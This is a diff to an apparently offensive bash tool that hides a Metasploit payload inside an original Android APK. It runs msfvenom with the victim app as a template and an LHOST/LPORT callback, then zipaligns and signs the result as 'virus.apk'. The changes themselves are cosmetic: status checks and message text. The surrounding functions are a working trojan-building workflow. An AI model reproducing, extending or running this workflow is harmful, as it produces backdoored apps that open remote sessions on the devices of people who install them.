@@ -279,10 +279,13 @@ function embed_payload()
  echo "[*] Embedding MSF Payload in Orginal APK..."
  spinlong
  msfvenom -x $original_path -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $path/$apk_name.apk > /dev/null 2>&1
+ status=$?
  spinlong
  sleep 5
- echo -e $yellow
- echo "[✔] Done."
+ echo ""
+ if [ $status -eq 0 ]; then
+ echo -e $yellow "[*] Done."
+ fi
  spinlong
  echo 
 }
@@ -290,7 +293,7 @@ function embed_payload()
 #function update apktool
 function up_apktook()
 {
- echo -e $yellow ""
+ echo -e $yellow
  echo "[*] Removing 1.apk Framework File..."
  spinlong
  apktool empty-framework-dir --force > /dev/null 2>&1
@@ -603,7 +606,7 @@ function sign()
  zipalign 4 virus.apk $apk_name.apk 2>&1
  rc=$?
  echo -e $yellow
- echo "[✔] Done."
+ echo "[*] Done."
  spinlong
  if [ $rc != 0 ]; then
    echo -e $red ""
@@ -696,7 +699,6 @@ clear
                 get_payload
                 echo
                 orig_apk
-                echo
                 spinlong
                 up_apktook
                 embed_payload
